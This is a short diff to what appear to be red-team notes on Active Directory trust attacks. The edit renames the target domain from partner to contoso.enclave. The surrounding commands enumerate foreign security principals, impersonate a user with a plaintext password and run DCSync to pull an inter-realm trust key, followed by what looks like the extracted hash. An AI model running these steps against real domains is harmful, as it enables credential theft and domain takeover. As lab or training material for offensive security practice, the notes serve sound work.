@@ -26,7 +26,7 @@ ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,
 
 Enumerate the Foreign Security Principals Container.
 ```powershell
-ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
+ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname contoso.enclave --dn DC=contoso,DC=enclave
 ```
 
 Enumerate interesting SID
@@ -39,7 +39,7 @@ ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
 Perform DCSync to obtain inter-realm key.
 ```powershell
 make_token CONTOSO\dyork Passw0rd!
-dcsync contoso.com CONTOSO\PARTNER$
+dcsync contoso.com CONTOSO\ENCLAVE$
 rev2self
 
 700f2ef9f5c327c5acb0502277ba9b3847b9e0454dbf27d3658f7249c32e924b
